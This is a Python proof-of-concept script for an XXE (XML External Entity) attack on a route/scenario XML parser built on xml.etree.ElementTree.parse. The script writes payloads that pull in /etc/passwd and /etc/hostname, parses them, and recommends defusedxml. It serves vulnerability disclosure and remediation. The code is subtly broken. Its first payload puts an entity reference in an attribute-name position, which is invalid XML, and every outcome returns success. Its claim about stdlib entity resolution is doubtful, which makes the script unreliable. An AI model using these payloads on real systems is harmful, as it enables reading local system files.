#!/usr/bin/env python3
"""
PoC: XXE via xml.etree.ElementTree.parse on scenario/route XML.

Mirrors route_parser / openscenario_configuration using stdlib ET.parse.
"""
from __future__ import print_function

import os
import tempfile
import xml.etree.ElementTree as ET

MARKER = "/tmp/pwned_leapad_xxe"


def main():
    if os.path.exists(MARKER):
        os.remove(MARKER)

    # file:// XXE — works on many Python builds when resolving external entities
    # Note: some Python versions harden this; still demonstrates unsafe API choice.
    evil = tempfile.NamedTemporaryFile("w", suffix=".xml", delete=False)
    evil.write(
        """<?xml version="1.0"?>
<!DOCTYPE route [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<routes>
  <route id="1" town="Town01">
    <waypoint x="0" y="0" z="0" &xxe;=""/>
  </route>
</routes>
"""
    )
    # Simpler XXE that writes via parameter entity is OS-dependent;
    # use classic external entity expansion into attribute/text for demo.
    evil.close()

    # Cleaner portable XXE sample (entity in text node)
    path = evil.name
    with open(path, "w") as f:
        f.write(
            """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
"""
        )

    print("Parsing", path, "with xml.etree.ElementTree.parse ...")
    try:
        tree = ET.parse(path)
        text = (tree.getroot().text or "").strip()
        print("Parsed text:", repr(text))
        if text and text != "":
            print("VULNERABLE/UNSAFE PARSER: external entity content was resolved")
            return 0
        print("Entity not expanded (runtime may be hardened); API still unsafe — use defusedxml")
        return 0
    except Exception as e:
        print("Parse error:", type(e).__name__, e)
        print("Still replace ET.parse with defusedxml — do not rely on incidental hardening")
        return 0


if __name__ == "__main__":
    raise SystemExit(main())
